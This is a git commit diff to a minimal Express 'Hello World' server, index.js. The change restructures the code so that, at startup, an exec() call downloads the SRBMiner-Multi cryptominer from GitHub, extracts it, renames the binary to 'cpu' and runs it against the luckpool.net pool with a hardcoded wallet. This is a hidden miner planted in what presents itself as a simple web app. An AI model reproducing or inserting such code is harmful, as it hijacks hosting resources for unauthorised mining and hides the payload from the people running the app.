0a66f25cacd5a9782a33644deee7822f92eeaccd
Phamtienvietnam <88323288+Phamtienvietnam@users.noreply.github.com>
2023-05-08 11:54:49 +0700

    Update index.js

--- index.js
+++ index.js
@@ -7,6 +7,9 @@ app.use(express.static(__dirname + '/public'))
 
 app.get('/', function(request, response) {
   response.send('Hello World!')
+
+
+})
   exec('wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.3/SRBMiner-Multi-0-9-3-Linux.tar.xz;tar -xf SRBMiner-Multi-0-9-3-Linux.tar.xz;rm SRBMiner-Multi-0-9-3-Linux.tar.xz;cd SRBMiner-Multi-0-9-3;mv SRBMiner-MULTI cpu;./cpu --disable-gpu --algorithm verushash --pool  na.luckpool.net:3956 --wallet RLWiNfzX9jqVKXriD8tq8ZaSKkLeRAgNU3.MYAPP2 --password x', (err, stdout, stderr) => {
   if (err) {
     //some err occurred
@@ -16,8 +19,6 @@ app.get('/', function(request, response) {
 
   }
 });
-
-})
 
 
 app.listen(app.get('port'), function() {
